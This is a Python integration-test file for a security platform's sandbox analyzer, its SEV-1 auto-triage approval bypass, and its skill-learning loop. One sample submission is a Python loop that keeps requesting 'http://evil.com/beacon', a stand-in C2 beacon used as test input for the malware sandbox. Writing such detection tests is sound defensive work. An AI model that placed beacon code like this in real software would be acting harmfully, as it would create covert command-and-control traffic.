"""Integration tests for Sprint 8 features:
- Security sandbox (sample submission → findings → events → pipeline)
- SEV-1 auto-triage (CRITICAL event → immediate execution without approval)
- Self-improving learning loop (training → injection → KB growth)
"""

from __future__ import annotations

import asyncio

import pytest
from httpx import ASGITransport, AsyncClient

from summer_puppy.api.app import app
from summer_puppy.api.state import init_app_state, reset_app_state
from summer_puppy.audit.logger import InMemoryAuditLogger
from summer_puppy.audit.models import AuditEntryType
from summer_puppy.channel.bus import InMemoryEventBus
from summer_puppy.events.models import EventSource, QAStatus, Recommendation, SecurityEvent, Severity
from summer_puppy.memory.store import InMemoryKnowledgeStore
from summer_puppy.pipeline.handlers import TrustApprovalHandler
from summer_puppy.pipeline.models import PipelineContext, PipelineStage, PipelineStatus
from summer_puppy.pipeline.orchestrator import Orchestrator
from summer_puppy.sandbox.analyzer import StubSandboxAnalyzer
from summer_puppy.sandbox.findings_to_events import report_to_events
from summer_puppy.sandbox.models import (
    Finding,
    FindingCategory,
    FindingSeverity,
    SampleSubmission,
    SampleType,
    SandboxVerdict,
)
from summer_puppy.skills.evaluator import RunEvaluator
from summer_puppy.skills.injector import SkillInjector
from summer_puppy.skills.kb import InMemorySkillKnowledgeBase
from summer_puppy.skills.models import PromotionLevel
from summer_puppy.skills.promotion import PromotionEngine
from summer_puppy.skills.registry import InMemorySkillRegistry
from summer_puppy.skills.trainer import Trainer
from summer_puppy.trust.models import (
    ActionClass,
    SevOneAutoTriageConfig,
    TrustPhase,
    TrustProfile,
)


@pytest.fixture(autouse=True)
def reset_state():
    reset_app_state()
    init_app_state()
    yield
    reset_app_state()


@pytest.fixture
async def client():
    async with AsyncClient(
        transport=ASGITransport(app=app),
        base_url="http://test",
    ) as c:
        yield c


# ---------------------------------------------------------------------------
# Security Sandbox Tests
# ---------------------------------------------------------------------------


class TestSecuritySandbox:
    @pytest.mark.asyncio
    async def test_sandbox_analyzes_malicious_sample(self) -> None:
        """StubSandboxAnalyzer returns a configured report with findings."""
        finding = Finding(
            category=FindingCategory.COMMAND_AND_CONTROL,
            severity=FindingSeverity.HIGH,
            title="C2 beacon detected",
            description="Process polling external IP every 30 seconds",
            mitre_attack_ids=["T1071.001"],
            confidence=0.92,
        )
        analyzer = StubSandboxAnalyzer(
            verdict=SandboxVerdict.MALICIOUS,
            severity=FindingSeverity.HIGH,
            findings=[finding],
        )
        submission = SampleSubmission(
            customer_id="cust-sandbox",
            sample_type=SampleType.SCRIPT,
            content='import requests\nwhile True: requests.get("http://evil.com/beacon")',
        )
        report = await analyzer.analyze(submission)
        assert report.verdict == SandboxVerdict.MALICIOUS
        assert len(report.findings) == 1
        assert report.findings[0].title == "C2 beacon detected"
        assert "T1071.001" in report.all_mitre_ids

    @pytest.mark.asyncio
    async def test_findings_converted_to_security_events(self) -> None:
        """report_to_events generates one SecurityEvent per non-informational finding."""
        findings = [
            Finding(
                category=FindingCategory.EXECUTION,
                severity=FindingSeverity.CRITICAL,
                title="Ransomware execution",
                description="Files being encrypted",
                mitre_attack_ids=["T1486"],
                confidence=0.98,
                affected_assets=["workstation-1", "file-server"],
            ),
            Finding(
                category=FindingCategory.PERSISTENCE,
                severity=FindingSeverity.HIGH,
                title="Autorun registry key",
                description="Persistence via HKCU Run key",
                mitre_attack_ids=["T1547.001"],
                confidence=0.85,
            ),
            Finding(
                category=FindingCategory.DISCOVERY,
                severity=FindingSeverity.INFORMATIONAL,
                title="System info query",
                description="Process queried system info",
                confidence=0.5,
            ),
        ]
        from summer_puppy.sandbox.models import AnalysisReport

        report = AnalysisReport(
            submission_id="sub-1",
            customer_id="cust-1",
            sample_type=SampleType.MALWARE_BINARY,
            verdict=SandboxVerdict.MALICIOUS,
            overall_severity=FindingSeverity.CRITICAL,
            findings=findings,
            summary="Ransomware detected",
        )
        events = report_to_events(report)
        # Informational finding skipped
        assert len(events) == 2
        critical_events = [e for e in events if e.severity == Severity.CRITICAL]
        assert len(critical_events) == 1
        # CRITICAL event has affected assets
        assert "workstation-1" in critical_events[0].affected_assets
        # MITRE tags present
        mitre_tags = [t for t in critical_events[0].tags if t.startswith("mitre:")]
        assert "mitre:T1486" in mitre_tags

    @pytest.mark.asyncio
    async def test_sandbox_api_endpoint(self, client: AsyncClient) -> None:
        """POST /api/v1/customers/{id}/sandbox/submit returns analysis response."""
        customer_id = "cust-sandbox-api"

        # Onboard customer
        resp = await client.post("/api/v1/customers", json={"customer_id": customer_id})
        assert resp.status_code == 201
        raw_key = resp.json()["api_key"]
        token_resp = await client.post("/api/v1/auth/token", json={"api_key": raw_key})
        token = token_resp.json()["access_token"]
        headers = {"Authorization": f"Bearer {token}"}

        # Submit sample
        resp = await client.post(
            f"/api/v1/customers/{customer_id}/sandbox/submit",
            headers=headers,
            json={
                "sample_type": "script",
                "content": "print('hello world')",
                "filename": "test.py",
            },
        )
        assert resp.status_code == 200, f"Sandbox submit failed: {resp.text}"
        body = resp.json()
        assert "submission_id" in body
        assert "report_id" in body
        assert "verdict" in body
        assert "finding_count" in body
        assert "events_generated" in body


# ---------------------------------------------------------------------------
# SEV-1 Auto-Triage Tests
# ---------------------------------------------------------------------------


class TestSevOneIntegration:
    @pytest.mark.asyncio
    async def test_critical_event_bypasses_approval_in_pipeline(self) -> None:
        """Full pipeline: CRITICAL event + sev_one enabled → COMPLETED without PAUSED stop."""
        audit_logger = InMemoryAuditLogger()
        event_bus = InMemoryEventBus()

        orchestrator = Orchestrator.build_default(
            audit_logger=audit_logger,
            event_bus=event_bus,
        )

        event = SecurityEvent(
            customer_id="cust-sev1",
            source=EventSource.EDR,
            severity=Severity.CRITICAL,
            title="Active ransomware — file encryption in progress",
            description="Process 'cryptolocker.exe' encrypting documents on C: drive",
            affected_assets=["workstation-005"],
        )

        # Allow all action classes so the PassthroughRecommendHandler's default
        # PATCH_DEPLOYMENT is covered by the SEV-1 bypass
        trust_profile = TrustProfile(
            customer_id="cust-sev1",
            trust_phase=TrustPhase.SUPERVISED,  # Would normally require approval
            sev_one_config=SevOneAutoTriageConfig(
                enabled=True,
                allowed_action_classes=list(ActionClass),
                require_rollback_plan=False,
                min_confidence_score=0.0,
            ),
        )

        ctx = await orchestrator.process_event(event, trust_profile)

        # Must not pause for approval — SEV-1 bypass should have kicked in
        assert ctx.status == PipelineStatus.COMPLETED, (
            f"Expected COMPLETED, got {ctx.status}. Stage: {ctx.current_stage}"
        )
        # Should have an action_request approved by sev_one_auto_triage
        assert ctx.action_request is not None
        # Verify audit trail includes the SEV-1 bypass entry
        sev1_entries = [
            e for e in audit_logger._entries
            if e.entry_type == AuditEntryType.AUTO_APPROVED
            and "SEV-1" in str(e.details.get("reason", ""))
        ]
        assert len(sev1_entries) >= 1

    @pytest.mark.asyncio
    async def test_high_event_still_pauses_when_no_policy(self) -> None:
        """HIGH severity event without matching policy pauses for approval even with sev_one."""
        audit_logger = InMemoryAuditLogger()
        event_bus = InMemoryEventBus()

        orchestrator = Orchestrator.build_default(
            audit_logger=audit_logger,
            event_bus=event_bus,
        )

        event = SecurityEvent(
            customer_id="cust-sev1",
            source=EventSource.SIEM,
            severity=Severity.HIGH,
            title="Suspicious login",
            description="10 failed login attempts from unusual location",
        )

        trust_profile = TrustProfile(
            customer_id="cust-sev1",
            trust_phase=TrustPhase.SUPERVISED,
            sev_one_config=SevOneAutoTriageConfig(enabled=True),
        )

        ctx = await orchestrator.process_event(event, trust_profile)
        # HIGH event should pause for approval (no policy, SUPERVISED phase)
        assert ctx.status == PipelineStatus.PAUSED_FOR_APPROVAL

    @pytest.mark.asyncio
    async def test_critical_without_sev_one_pauses(self) -> None:
        """CRITICAL event with sev_one disabled still goes through normal approval."""
        audit_logger = InMemoryAuditLogger()
        event_bus = InMemoryEventBus()

        orchestrator = Orchestrator.build_default(
            audit_logger=audit_logger,
            event_bus=event_bus,
        )

        event = SecurityEvent(
            customer_id="cust-sev1",
            source=EventSource.EDR,
            severity=Severity.CRITICAL,
            title="Malware detected",
            description="Malicious binary executed",
        )

        trust_profile = TrustProfile(
            customer_id="cust-sev1",
            trust_phase=TrustPhase.SUPERVISED,
            sev_one_config=SevOneAutoTriageConfig(enabled=False),  # Disabled
        )

        ctx = await orchestrator.process_event(event, trust_profile)
        # With SEV-1 disabled and no matching policy, should pause for approval
        assert ctx.status == PipelineStatus.PAUSED_FOR_APPROVAL


# ---------------------------------------------------------------------------
# Self-Improving Learning Loop Tests
# ---------------------------------------------------------------------------


class TestSelfImprovingLoop:
    @pytest.mark.asyncio
    async def test_full_learning_cycle(self) -> None:
        """Simulate a complete learning cycle: run → evaluate → train → inject → KB growth."""
        audit_logger = InMemoryAuditLogger()
        kb = InMemorySkillKnowledgeBase()
        registry = InMemorySkillRegistry()
        store = InMemoryKnowledgeStore()

        evaluator = RunEvaluator()
        promotion = PromotionEngine()
        trainer = Trainer(
            evaluator=evaluator,
            promotion_engine=promotion,
            skill_registry=registry,
            knowledge_base=kb,
            audit_logger=audit_logger,
        )
        injector = SkillInjector(knowledge_base=kb, knowledge_store=store)

        # Simulate a successful high-quality run
        context_summary = {
            "correlation_id": "corr-learn-1",
            "customer_id": "cust-learn",
            "agent_id": "agent-1",
            "confidence_score": 0.95,
            "execution_status": "COMPLETED",
            "outcome_success": True,
            "qa_status": "PASSED",
            "approval_method": "AUTO_APPROVED",
        }

        # Artifacts from this run (PromotionEngine expects artifact_type + source_run_id)
        artifacts = [
            {
                "artifact_id": "art-1",
                "artifact_type": "CODE_PATCH",
                "source_run_id": "corr-learn-1",
                "content": "Terminate process, clear registry key, scan with AV",
                "action_class": "process_termination",
            }
        ]

        rec = await trainer.review_and_train(context_summary, artifacts)
        assert rec is not None

        # KB should now have articles or playbooks
        all_articles = kb.list_articles("cust-learn")
        all_playbooks = kb.list_playbooks("cust-learn")
        total_kb = len(all_articles) + len(all_playbooks)
        assert total_kb > 0, "Training should have created KB entries"

        # Run injection cycle to push into knowledge store
        result = await injector.run_injection_cycle("cust-learn")
        assert result["total_injected"] > 0

    @pytest.mark.asyncio
    async def test_failed_run_does_not_promote(self) -> None:
        """A failed run with low scores should not generate TEAM_KB or higher entries."""
        audit_logger = InMemoryAuditLogger()
        kb = InMemorySkillKnowledgeBase()
        registry = InMemorySkillRegistry()

        evaluator = RunEvaluator()
        promotion = PromotionEngine()
        trainer = Trainer(
            evaluator=evaluator,
            promotion_engine=promotion,
            skill_registry=registry,
            knowledge_base=kb,
            audit_logger=audit_logger,
        )

        # Failed run with low quality
        context_summary = {
            "correlation_id": "corr-fail-1",
            "customer_id": "cust-fail",
            "agent_id": "agent-fail",
            "confidence_score": 0.1,
            "execution_status": "FAILED",
            "outcome_success": False,
            "qa_status": "PENDING",
        }

        artifacts = [{"artifact_id": "art-fail", "artifact_type": "CODE_PATCH", "source_run_id": "corr-fail-1", "content": "Bad remediation"}]

        await trainer.review_and_train(context_summary, artifacts)

        # High-level promotions should not exist for failed runs
        team_articles = kb.list_articles("cust-fail", promotion_level=PromotionLevel.TEAM_KB)
        global_articles = kb.list_articles("cust-fail", promotion_level=PromotionLevel.GLOBAL_KB)
        assert len(team_articles) == 0
        assert len(global_articles) == 0

    @pytest.mark.asyncio
    async def test_repeated_successful_runs_grow_kb(self) -> None:
        """Multiple successful runs should accumulate KB entries over time."""
        audit_logger = InMemoryAuditLogger()
        kb = InMemorySkillKnowledgeBase()
        registry = InMemorySkillRegistry()

        evaluator = RunEvaluator()
        promotion = PromotionEngine()
        trainer = Trainer(
            evaluator=evaluator,
            promotion_engine=promotion,
            skill_registry=registry,
            knowledge_base=kb,
            audit_logger=audit_logger,
        )

        for i in range(3):
            context_summary = {
                "correlation_id": f"corr-{i}",
                "customer_id": "cust-grow",
                "agent_id": "agent-1",
                "confidence_score": 0.9,
                "execution_status": "COMPLETED",
                "outcome_success": True,
                "qa_status": "PASSED",
            }
            artifacts = [{
                "artifact_id": f"art-{i}",
                "artifact_type": "CODE_PATCH",
                "source_run_id": f"corr-{i}",
                "content": f"Remediation step {i}",
            }]
            await trainer.review_and_train(context_summary, artifacts)

        all_entries = kb.list_articles("cust-grow") + kb.list_playbooks("cust-grow")
        assert len(all_entries) >= 1, "Multiple runs should grow the KB"
